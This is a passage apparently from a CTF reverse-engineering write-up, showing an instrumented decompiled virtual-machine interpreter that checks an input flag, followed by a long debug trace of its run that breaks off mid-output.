<span class="keyword">if</span> ( (<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)length_of_file != <span class="built_in">fread</span>(v8, <span class="number">1uLL</span>, v6, v5) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="built_in">fclose</span>(v5);</span><br><span class="line">    v4 = <span class="string">&quot;err 5&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_400896</span>() )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line">    _BYTE *v1; <span class="comment">// rbp</span></span><br><span class="line">    <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">    __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rax</span></span><br><span class="line">    __int64 v8; <span class="comment">// rax</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">    __int64 v11; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> v12; <span class="comment">// dl</span></span><br><span class="line">    <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">    _BYTE *v15; <span class="comment">// rax</span></span><br><span class="line">    __int64 v16; <span class="comment">// rax</span></span><br><span class="line">    __int64 v17; <span class="comment">// rax</span></span><br><span class="line">    __int64 v18; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">    v0 = <span class="number">0LL</span>;</span><br><span class="line">    v1 = (<span class="type">unsigned</span> <span class="type">char</span>*)ptr;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = v0 + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//    printf(&quot;v2 = v0 + 1;\n&quot;);</span></span><br><span class="line">        <span class="keyword">switch</span> ( v1[v0] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;return \n&quot;</span>&lt;&lt;*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2]&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2];</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v4 = v2;</span><br><span class="line">            v2 = v0 + <span class="number">9</span>;</span><br><span class="line">            v1[*(<span class="type">int</span> *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>];</span><br><span class="line"><span class="comment">//      printf(&quot;v4 = v2\n&quot;);</span></span><br><span class="line"><span class="comment">//      printf(&quot;v2 = v0 + 9\n&quot;);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v1[%d] = %u\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v4],*(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v5 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v6 = *(<span class="type">int</span> *)&amp;v1[v5];</span><br><span class="line"><span class="comment">//      printf(&quot;v5 = v2\n&quot;);</span></span><br><span class="line"><span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line"><span class="comment">//      printf(&quot;v6 = v1[%lld] (%d)\n&quot;,v5,*(int *)&amp;v1[v5]);</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            v7 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v8 = *(<span class="type">int</span> *)&amp;v1[v7];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v7 = v2\n&quot;</span>);</span><br><span class="line"><span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v8 = v1[%lld] (%d)\n&quot;</span>,v7,*(<span class="type">int</span> *)&amp;v1[v7]);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v9 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v10 = (<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]];</span><br><span class="line"><span class="comment">//      printf(&quot;v9 = v2\n&quot;);</span></span><br><span class="line"><span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v10 = v1[%d] (%d)\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v9],(<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]]);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            v11 = v2;      </span><br><span class="line">            v12 = dword_6010A4;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v8 = *(<span class="type">int</span> *)&amp;v1[v11];</span><br><span class="line"><span class="comment">//      printf(&quot;v11 = v2\n&quot;);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v12 = dword_6010A4\n&quot;</span>);</span><br><span class="line"><span class="comment">//      printf(&quot;v2 +=4\n&quot;);</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v8 = v1[%lld] (%d)\n&quot;</span>,v11,*(<span class="type">int</span> *)&amp;v1[v11]);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            v13 = dword_6010A4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v13 = dwod_6010A4 (%d)\n&quot;</span>,dword_6010A4);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            v14 = ~(dword_6010A4 &amp; c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4 = %d ; c = %d\n&quot;</span>,dword_6010A4,c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v14 = dword_6010A4 nand c\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;input:\n&quot;</span>);</span><br><span class="line">            v14 = <span class="built_in">getchar</span>();</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB</span>:                                            <span class="comment">//the output of judgement</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;output:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">            v15 = &amp;v1[*(<span class="type">int</span> *)&amp;v1[v2]];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v15 = &amp;v1[%d] (%d)\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v2],v1[*(<span class="type">int</span> *)&amp;v1[v2]]);</span><br><span class="line">            <span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">                v2 = *(_DWORD *)&amp;v1[v2 + <span class="number">4</span>];</span><br><span class="line">                --*v15;</span><br><span class="line"><span class="comment">//        printf(&quot;v2 = v1[%d]\n&quot;,v2+4);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;--*v15\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//        printf(&quot;v2 += 8\n&quot;);</span></span><br><span class="line">                v2 += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">            ++c;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;c++\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">            ++dword_6010A4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4++\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">            v14 = dword_6010A4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v14 = dword_6010A4\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">            v10 = c;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v10 = c(%d)\n&quot;</span>,c);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            v16 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v13 = *(_DWORD *)&amp;v1[v16];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v13 = v1[%lld] (%d)\n&quot;</span>,v16,c);</span><br><span class="line"><span class="comment">//      printf(&quot;v16 = v2 (%d)\n&quot;,v2);</span></span><br><span class="line"><span class="comment">//      printf(&quot;v2 += 2\n&quot;);</span></span><br><span class="line">            LABEL_23:</span><br><span class="line">                c += v13;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;c += v13\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">            v6 = dword_6010A4;</span><br><span class="line"><span class="comment">//      printf(&quot;v6 = dword_6010A4\n&quot;);</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">            v6 = c;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v6 = c\n&quot;</span>);</span><br><span class="line">            LABEL_27:</span><br><span class="line">                v14 = (<span class="type">char</span>)v1[v6];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v14 = v1[%d] (%c)\n&quot;</span>,v6,v14);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">            v17 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v14 = *(_DWORD *)&amp;v1[v17];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v14 =v1[%lld] (%d)\n&quot;</span>,v17,v14);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">            v18 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v10 = *(_DWORD *)&amp;v1[v18];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v10 =v1[%lld] (%d)\n&quot;</span>,v18,v10);</span><br><span class="line">            LABEL_21:</span><br><span class="line">                dword_6010A4 = v10;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;dword_6010A4 = v10\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">            v8 = dword_6010A4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v8 = dword_6010A4\n&quot;</span>);</span><br><span class="line">            LABEL_31:</span><br><span class="line">                v12 = c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v12 = c\n&quot;</span>);</span><br><span class="line">                LABEL_9:</span><br><span class="line">                    v1[v8] = v12;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;v1[%lld] = v12 (%d)\n&quot;</span>,v8,v12);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">            v14 = c - dword_6010A4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;__dword_6010A4 = %d     c = %d\n&quot;</span>,dword_6010A4,c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;v14 = c - dword_6010A4\n&quot;</span>);</span><br><span class="line">            LABEL_12:</span><br><span class="line">                c = v14;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;c = v14\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">            <span class="keyword">if</span> ( c )&#123;</span><br><span class="line">                LABEL_35:</span><br><span class="line"><span class="comment">//          printf(&quot;v2 = v1[%d]\n&quot;,v2);</span></span><br><span class="line">                    v2 = *(_DWORD *)&amp;v1[v2];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                v2 = v0 + <span class="number">5</span>;</span><br><span class="line"><span class="comment">//        printf(&quot;v2 = v0 + 5\n&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt;= length_of_file )&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;length end\nreturn;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        v0 = v2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>outputs:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v10 =v1[49] (256)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[257] (I)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Iv15 = &amp;v1[256] (10)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[258] (n)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">nv15 = &amp;v1[256] (9)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[259] (p)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">pv15 = &amp;v1[256] (8)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[260] (u)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">uv15 = &amp;v1[256] (7)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[261] (t)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">tv15 = &amp;v1[256] (6)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[262] ( )</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line"> v15 = &amp;v1[256] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[263] (F)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">Fv15 = &amp;v1[256] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[264] (l)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">lv15 = &amp;v1[256] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[265] (a)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">av15 = &amp;v1[256] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[266] (g)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">gv15 = &amp;v1[256] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">v14 = v1[267] (:)</span><br><span class="line">c = v14</span><br><span class="line">output:</span><br><span class="line">:v15 = &amp;v1[256] (0)</span><br><span class="line">v10 =v1[67] (272)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">00000000000000000000000000000000000000</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[273] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (31)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[274] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (30)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[275] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (29)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[276] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (28)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[277] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (27)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[278] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (26)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[279] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (25)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[280] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (24)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[281] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (23)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[282] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (22)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[283] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (21)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[284] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (20)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[285] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (19)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[286] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (18)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[287] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (17)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[288] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (16)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[289] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (15)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[290] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (14)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[291] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (13)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[292] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (12)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[293] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (11)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[294] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (10)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[295] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (9)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[296] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (8)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[297] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (7)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[298] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (6)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[299] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (5)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[300] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (4)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[301] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (3)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[302] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (2)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[303] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (1)</span><br><span class="line">--*v15</span><br><span class="line">dword_6010A4++</span><br><span class="line">input:</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[304] = v12 (48)</span><br><span class="line">v15 = &amp;v1[272] (0)</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(32)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (32)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[273] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 32 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 32</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-1)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -1</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (16)</span><br><span class="line">v14 = v1[320] ( )</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (32)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(273)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[273] = v12 (16)</span><br><span class="line">v10 = v1[320] (32)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (33)</span><br><span class="line">v15 = &amp;v1[325] (31)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (!)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (33)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[274] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 